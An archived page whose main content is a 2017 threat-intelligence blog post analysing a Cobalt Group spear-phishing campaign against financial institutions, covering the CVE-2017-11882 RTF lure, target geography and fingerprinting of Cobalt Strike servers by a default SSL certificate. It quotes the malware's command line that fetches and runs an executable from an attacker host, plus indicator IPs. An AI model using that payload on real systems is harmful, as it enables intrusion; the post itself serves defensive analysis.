			<span class="c-logo" style="background-image:url(https://archive.org/services/img/archiveteam);"></span>
		Organization: <a style="color:#33f;" href="https://archive.org/details/archiveteam" target="_new"><span class="wm-title">Archive Team</span></a>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  <img align=right src="http://archiveteam.org/images/e/e6/Archiveteam.jpg" width=200> Formed in 2009, the Archive Team (not to be confused with the archive.org Archive-It Team) is a rogue archivist collective dedicated to saving copies of rapidly dying or deleted websites for the sake of history and digital heritage. The group is 100% composed of volunteers and interested parties, and has expanded into a large amount of related projects for saving online and digital history.
<p>
History is littered with hundreds of conflicts over the future of a community, group, location or business that were "resolved" when one of the parties stepped ahead and destroyed what was there. With the original point of contention destroyed, the debates would fall to the wayside. Archive Team believes that by duplicated condemned data, the conversation and debate can continue, as well as the richness and insight gained by keeping the materials. Our projects have ranged in size from a single volunteer downloading the data to a small-but-critical site, to over 100 volunteers stepping forward to acquire terabytes of user-created data to save for future generations.
<p>
The main site for Archive Team is at <a href="http://www.archiveteam.org">archiveteam.org</a> and contains up to the date information on various projects, manifestos, plans and walkthroughs.
<p>
This collection contains the output of many Archive Team projects, both ongoing and completed. Thanks to the generous providing of disk space by the Internet Archive, multi-terabyte datasets can be made available, as well as in use by the <a href="http://archive.org/web/web.php">Wayback Machine</a>, providing a path back to lost websites and work. 
<p>
Our collection has grown to the point of having sub-collections for the type of data we acquire. If you are seeking to browse the contents of these collections, the Wayback Machine is the best first stop. Otherwise, you are free to dig into the stacks to see what you may find.
<p>
<b>The Archive Team Panic Downloads</b> are full pulldowns of currently extant websites, meant to serve as emergency backups for needed sites that are in danger of closing, or which will be missed dearly if suddenly lost due to hard drive crashes or server failures. 
<p>
	</div>
	      </div>
      <div style="display:inline-block;vertical-align:top;width:49%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/archivebot)"></span>
		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/archivebot" target="_new"><span class="wm-title">ArchiveBot: The Archive Team Crowdsourced Crawler</span></a></div>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  ArchiveBot is an IRC bot designed to automate the archival of smaller websites (e.g. up to a few hundred thousand URLs). You give it a URL to start at, and it grabs all content under that URL, records it in a WARC, and then uploads that WARC to ArchiveTeam servers for eventual injection into the Internet Archive (or other archive sites).
<p>
To use ArchiveBot, drop by #archivebot on EFNet. To interact with ArchiveBot, you issue commands by typing it into the channel. Note you will need channel operator permissions in order to issue archiving jobs. The dashboard shows the sites being downloaded currently.
<p>
There is a dashboard running for the archivebot process at <a href="http://www.archivebot.com">http://www.archivebot.com</a>.
<p>
ArchiveBot's source code can be found at <a href="https://github.com/ArchiveTeam/ArchiveBot">https://github.com/ArchiveTeam/ArchiveBot</a>.

                        <h3 class="article-title">Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions</h3>
                        <h5 class="article-date-author">
                            <div class="date"> November 28, 2017</div>
                            <div class="author"> Yonathan Klijnsma</div>
                        </h5>

                    </div>

                    <div class="new-blog-content">
                        <div class="blog-wrap">
                            <div class="featured-image">
                                <img src="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_istock-490664808.jpg ">
                            </div>

                            <div class="at-above-post addthis_tool" data-url="https://web.archive.org/web/20190508170630oe_/https://www.riskiq.com/blog/labs/cobalt-strike/"></div><p><span style="font-weight: 400;">In a recent spear-phishing campaign, the Cobalt Hacking Group used a remote code execution vulnerability in Microsoft Office software to connect to its command and control server via Cobalt Strike. However, they gave up much more information than they intended.</span></p>
<p><span style="font-weight: 400;">On Tuesday, November 21, a massive spear-phishing campaign began targeting individual employees at various financial institutions, mostly in Russia and Turkey. Purporting to provide info on changes to ‘SWIFT’ terms, the email contained a single attachment with no text in the body. It was an attempt by </span><span style="font-weight: 400;">the Cobalt Group to gain a foothold in the networks of the targeted individuals&#8217; organizations:</span></p>
<div id="attachment_13287" style="width: 742px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13287" class="wp-image-13287 size-full" src="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image4.png" alt="In a recent spear-phishing campaign, the Cobalt Group used a known CVE to connect to its C&amp;C server via Cobalt Strike, but ended up revealing all targets." width="732" height="649" srcset="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image4.png 732w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image4-300x266.png 300w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image4-500x443.png 500w" sizes="(max-width: 732px) 100vw, 732px"/><p id="caption-attachment-13287" class="wp-caption-text">Fig-1 What the targets saw</p></div>
<p><span style="font-weight: 400;">However, rather than putting their targets in BCC, the attackers put the entire list in the &#8216;TO&#8217; field allowing us to see their full list of intended targets. This isn’t the first time we&#8217;ve seen attackers make this error—back in March, an attack focussing on 1,880 targets across financial institutions in Kazakhstan had the same flaw.</span></p>
<div id="attachment_13288" style="width: 612px" class="wp-caption aligncenter"><a href="https://web.archive.org/web/20190508170630/https://twitter.com/ydklijnsma/status/846766178093731840"><img aria-describedby="caption-attachment-13288" class="wp-image-13288 size-full" src="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image1.png" alt="In a recent spear-phishing campaign, the Cobalt Group used a known CVE to connect to its C&amp;C server via Cobalt Strike, but ended up revealing all targets." width="602" height="746" srcset="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image1.png 602w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image1-242x300.png 242w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image1-403x500.png 403w" sizes="(max-width: 602px) 100vw, 602px"/></a><p id="caption-attachment-13288" class="wp-caption-text">Fig-2 As first seen on Twitter</p></div>
<h3><span style="font-weight: 400;">Payload Analysis</span></h3>
<p><span style="font-weight: 400;">The attachment in the email is an RTF document abusing the </span><a href="https://web.archive.org/web/20190508170630/https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about"><span style="font-weight: 400;">recently disclosed exploit</span></a><span style="font-weight: 400;"> referred to as </span><a href="https://web.archive.org/web/20190508170630/https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882"><span style="font-weight: 400;">CVE-2017-11882</span></a><span style="font-weight: 400;"> which is capable of leveraging Office 2007 to 2016 to execute code. The file ‘Swift changes.rtf’ uses this exploit to start a remote payload like so:</span></p>
<p><em><span style="font-weight: 400;">cmd /c start \\138.68.234.128\w\w.exe &amp;AAAAAC</span></em></p>
<p><span style="font-weight: 400;">The payload is a stager for a tool known as ‘Cobalt Strike’ which, normally, is used in red teaming and pen testing engagements. The framework has gained some notoriety with adversaries as it&#8217;s been </span><a href="https://web.archive.org/web/20190508170630/http://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/"><span style="font-weight: 400;">used in multiple attacks against financial institutions in the past</span></a><span style="font-weight: 400;">.</span></p>
<p><span style="font-weight: 400;">The Cobalt Strike beacon eventually connects to </span><a href="https://web.archive.org/web/20190508170630/https://community.riskiq.com/search/104.144.207.207"><span style="font-weight: 400;">104.144.207.207</span></a><span style="font-weight: 400;"> which is the group&#8217;s command and control server for this attack. </span><span style="font-weight: 400;">A very detailed analysis of the Cobalt Group’s activities and the way they operate can be found here: </span><a href="https://web.archive.org/web/20190508170630/http://blog.ptsecurity.com/2017/08/cobalt-group-2017-cobalt-strikes-back.html"><span style="font-weight: 400;">[ Cobalt strikes back: an evolving multinational threat to finance ]</span></a><span style="font-weight: 400;">.</span></p>
<h3><span style="font-weight: 400;">Targets</span></h3>
<p><span style="font-weight: 400;">We won’t be disclosing the recipients of the email, but we will take a look at the targeting from a geographical perspective. The majority of targeting was focused on Turkey and Russia, but there was also a broad attempt at a compromise, targeting employees of one financial institution in eight different countries. </span></p>
<p><span style="font-weight: 400;">Our list of countries in which employees were targeted includes the United States, Netherlands, Italy, Austria, Ukraine, Turkey, Ukraine, Russia, Jordan, Kuwait, and the Czech Republic:</span></p>
<div id="attachment_13289" style="width: 810px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13289" class="wp-image-13289 size-full" src="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image3-16.png" alt="In a recent spear-phishing campaign, the Cobalt Group used a known CVE to connect to its C&amp;C server via Cobalt Strike, but ended up revealing all targets." width="800" height="420" srcset="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image3-16.png 800w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image3-16-300x158.png 300w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image3-16-768x403.png 768w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image3-16-500x263.png 500w" sizes="(max-width: 800px) 100vw, 800px"/><p id="caption-attachment-13289" class="wp-caption-text">Fig-3 Targeted countries highlighted in red</p></div>
<p><span style="font-weight: 400;"><br/>
</span><span style="font-weight: 400;">One thing we noticed when analyzing the targets of this campaign was that there were a lot of direct employee email addresses on the list, which make their emails more convincing. More interesting is that the majority of these email addresses were found simply by Googling for email addresses for the financial institution making it likely the attackers used open source intelligence to gather their list of targets, and no prior information was needed to get the addresses. </span></p>
<h3><span style="font-weight: 400;">Finding More Cobalt Strike</span></h3>
<p><span style="font-weight: 400;">At RiskIQ, one of the datasets built from our large quantities of Internet data is a repository of SSL certificates and where we&#8217;ve seen them. What’s interesting about the case mentioned above is that the host is using a certificate seemingly shipped with Cobalt Strike by default. We can look up the certificate in RiskIQ Community via its SHA1 fingerprint: </span><a href="https://web.archive.org/web/20190508170630/https://community.riskiq.com/search/certificate/sha1/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c"><span style="font-weight: 400;">6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c</span></a></p>
<div id="attachment_13290" style="width: 682px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13290" class="wp-image-13290 size-full" src="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image5.png" alt="In a recent spear-phishing campaign, the Cobalt Group used a known CVE to connect to its C&amp;C server via Cobalt Strike, but ended up revealing all targets." width="672" height="368" srcset="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image5.png 672w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image5-300x164.png 300w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/image5-500x274.png 500w" sizes="(max-width: 672px) 100vw, 672px"/><p id="caption-attachment-13290" class="wp-caption-text">Fig-4 SSL data inside RiskIQ Community</p></div>
<p><span style="font-weight: 400;">What we find is that at least a 100 different hosts seem to have been running an HTTPS server with the same certificate. If we jump over to our </span><a href="https://web.archive.org/web/20190508170630/https://www.riskiq.com/products/security-intelligence-services/"><span style="font-weight: 400;">SIS API</span></a><span style="font-weight: 400;">, we find that there have been 816(!) hosts running an HTTPS server with this certificate—all Cobalt Strike servers using a default certificate. To ensure our findings were correct, we confirmed them with previously reported threats that involved Cobalt Strike. </span></p>

<p><span style="font-weight: 400;">Below is the amount of Cobalt Strike servers actively seen in our data from June 2015 until March 2016:</span></p>
<div id="attachment_13297" style="width: 810px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13297" class="wp-image-13297 size-full" src="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image2-17.png" alt="In a recent spear-phishing campaign, the Cobalt Group used a known CVE to connect to its C&amp;C server via Cobalt Strike, but ended up revealing all targets." width="800" height="285" srcset="https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image2-17.png 800w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image2-17-300x107.png 300w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image2-17-768x274.png 768w, https://web.archive.org/web/20190508170630im_/https://cdn.riskiq.com/wp-content/uploads/2017/11/rsz_image2-17-500x178.png 500w" sizes="(max-width: 800px) 100vw, 800px"/><p id="caption-attachment-13297" class="wp-caption-text">Fig-5 Instances of Cobalt Strike servers detected by RiskIQ</p></div>
<p><span style="font-weight: 400;">One thing to keep in mind is that Cobalt Strike is not always used by adversaries with malicious intent. Formally, Cobalt Strike is sold as a toolset for pen testing and red teaming engagements. </span></p>
<p><span style="font-weight: 400;">We’ve put all the hosts we’ve seen running Cobalt Strike with a default SSL certificate in a RiskIQ Community project. The SSL certificate is also included in this set: </span><a href="https://web.archive.org/web/20190508170630/https://community.riskiq.com/projects/3dbf939a-fcac-948d-07dc-4f657747bca5?guest=true&amp;utm_campaign=research_cobaltstrike&amp;utm_source=blog&amp;utm_medium=blog&amp;utm_content=project_cobaltstrike"><span style="font-weight: 400;">https://community.riskiq.com/projects/19bb67dd-2c51-7284-e5f2-7b79537e13d3</span></a></p>

<h3>Learn More</h3>
<p><span style="font-weight: 400;">RiskIQ gathers petabytes of data through crawling the entire internet and has amassed data sets that include SSL certificates and many more. </span><span style="font-weight: 400;">SSL certificates can provide context by showing whether a domain or IP is legitimate based on its certificate, identify self-signed certificates versus third-party authority, and identify IP clusters and additional certificates based on shared certificates. <a href="https://web.archive.org/web/20190508170630/https://www.riskiq.com/platform/architecture/internet-data-sets/">Click here</a> f</span><span style="font-weight: 400;">or more information about how analysts can use SSL certificates to connect disparate malicious network infrastructure. </span></p>
<p><span style="font-weight: 400;">Track the IOCs from this attack, including those listed above, in the RiskIQ Community Project located <a href="https://web.archive.org/web/20190508170630/https://community.riskiq.com/projects/3dbf939a-fcac-948d-07dc-4f657747bca5?guest=true&amp;utm_campaign=research_cobaltstrike&amp;utm_source=blog&amp;utm_medium=blog&amp;utm_content=project_cobaltstrike">here.</a></span></p>
